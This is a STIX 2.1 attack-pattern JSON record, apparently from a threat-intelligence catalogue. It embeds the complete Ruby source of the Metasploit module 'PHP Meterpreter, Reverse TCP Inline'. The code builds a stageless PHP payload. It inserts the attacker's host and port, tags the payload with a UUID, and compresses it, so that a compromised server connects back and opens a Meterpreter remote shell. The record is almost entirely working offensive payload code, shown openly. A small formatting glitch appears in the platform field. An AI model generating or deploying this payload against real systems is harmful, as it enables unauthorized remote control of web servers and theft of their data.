{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0038b262-0ea1-4c1e-8247-9f000d8137b4",
    "created": "2024-08-14T16:33:19.289729Z",
    "modified": "2024-08-14T16:33:19.289733Z",
    "name": "PHP Meterpreter, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a Meterpreter server (PHP)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/php/meterpreter_reverse_tcp.rb",
            "external_id": "meterpreter_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nmodule MetasploitModule\n\n  CachedSize = 34854\n\n  include Msf::Payload::Single\n  include Msf::Payload::Php::ReverseTcp\n  include Msf::Sessions::MeterpreterOptions\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'PHP Meterpreter, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and spawn a Meterpreter server (PHP)',\n      'Author'        => ['egypt'],\n      'Platform'      => 'php',\n      'Arch'          => ARCH_PHP,\n      'License'       => MSF_LICENSE,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::Meterpreter_Php_Php))\n  end\n\n  def generate(_opts = {})\n    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')\n\n    met.gsub!(\"127.0.0.1\", datastore['LHOST']) if datastore['LHOST']\n    met.gsub!(\"4444\", datastore['LPORT'].to_s) if datastore['LPORT']\n\n    uuid = generate_payload_uuid\n    bytes = uuid.to_raw.chars.map { |c| '\\x%.2x' % c.ord }.join('')\n    met = met.sub(%q|\"PAYLOAD_UUID\", \"\"|, %Q|\"PAYLOAD_UUID\", \"#{bytes}\"|)\n\n    # Stageless payloads need to have a blank session GUID\n    session_guid = '\\x00' * 16\n    met = met.sub(%q|\"SESSION_GUID\", \"\"|, %Q|\"SESSION_GUID\", \"#{session_guid}\"|)\n\n    if datastore['MeterpreterDebugBuild']\n      met.sub!(%q|define(\"MY_DEBUGGING\", false);|, %Q|define(\"MY_DEBUGGING\", true);|)\n\n      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(datastore['MeterpreterDebugLogging'])\n      met.sub!(%q|define(\"MY_DEBUGGING_LOG_FILE_PATH\", false);|, %Q|define(\"MY_DEBUGGING_LOG_FILE_PATH\", \"#{logging_options[:rpath]}\");|) if logging_options[:rpath]\n    end\n\n    met.gsub!(/#.*$/, '')\n    met = Rex::Text.compress(met)\n    met\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}